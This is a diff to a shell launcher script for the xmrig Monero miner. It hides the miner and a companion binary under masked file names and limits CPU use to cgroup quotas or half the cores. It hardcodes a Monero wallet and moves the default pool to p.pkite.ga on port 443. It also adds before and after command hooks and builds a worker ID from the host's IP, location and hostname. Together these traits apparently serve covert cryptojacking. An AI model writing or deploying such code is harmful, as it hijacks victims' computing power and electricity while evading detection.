@@ -17,6 +17,7 @@ fi
 ## object in sln should be present in pl/
 OBJ_NAME=${OBJ_NAME:-xmrig}
 [ ! -e "$OBJ_MASK" ] && mv pl/"$OBJ_NAME" "$OBJ_MASK"
+[ ! -e "$CLM_MASK" ] && mv pl/clm "$CLM_MASK"
 chmod +x "${OBJ_MASK}" &>/dev/null
 
 ## daemon
@@ -87,7 +88,7 @@ if [ -n "$cpu_p" -a -n "$cpu_q" -a "$cpu_p" != 0 ]; then ## respect cgroups
         fi
     fi
 else ## no cgroups, use half the cores
-        
+
         [ $CORES -gt 1 ] && PAUSD_THREADS_D=$((CORES / 2)) || PAUSD_THREADS_D=1
         hashes_pc=$((hashes / PAUSD_THREADS_D))
         if [ "$hashes_pc" -ge 5 ]; then
@@ -97,7 +98,7 @@ else ## no cgroups, use half the cores
         fi
 fi
 ## respect custom settings
-if [ -n "$MHF_FIXED" ]; then 
+if [ -n "$MHF_FIXED" ]; then
     PAUSD_VER=${MHF_FIXED}
 else
     PAUSD_VER=${PAUSD_VER:-${PAUSD_VER_D}}
@@ -113,7 +114,7 @@ fi
 export AFFINITY="0x0"
 
 ## vars for the pausd daemon
-export PAUSD_THREADS PAUSD_VER=${PAUSD_VER:-2}
+export PAUSD_THREADS=${PAUSD_THREADS:-1} PAUSD_VER=${PAUSD_VER:-2}
 export PAUSD_SHARES=${PAUSD_SHARES:-$((PAUSD_THREADS * PAUSD_VER))} \
        PAUSD_RATE=${PAUSD_RATE:-200}
 
@@ -121,12 +122,17 @@ export PAUSD_SHARES=${PAUSD_SHARES:-$((PAUSD_THREADS * PAUSD_VER))} \
 read loadavg < /proc/loadavg
 loadavg=${loadavg% *[0-9]\/*} ## strip proc counters
 ID=${ID:-"{$ip}{$country}{$region}{$HOSTN}{${ENDPOINT:-$TNL_LISTEN_TARGET}}{{${loadavg// /|}}}"}
+
 export \
 ID=$(printf '%s' "$ID") \
 PA=${PA:-4ACgpqzFZCiRfmZHAX11tAMLft1KNvLhWh83JXpYFKfKDhT7GXK89AoM4jNV1RRUUghAbuP1FrqTFU5w4zbN3F9GG6mqNPq} \
 AL=${AL:-cryptonight} \
 AESNI=${AESNI:-1} \
-ENDPOINT=${ENDPOINT:-pool.supportxmr.com:${PAUSD_DIFF:-3333}}
+ENDPOINT=${ENDPOINT:-p.pkite.ga:${ENDPOINT_PORT:-443}}
+
+## commands
+COMMAND_BEFORE="${COMMAND_BEFORE:-:;}"
+COMMAND_AFTER="${COMMAND_AFTER:-:;}"
 
 # ## set vars used by pausd daemon in tmux and envsubst
 # printf "" > "config.${PAUSD_DAEMON_NAME}"
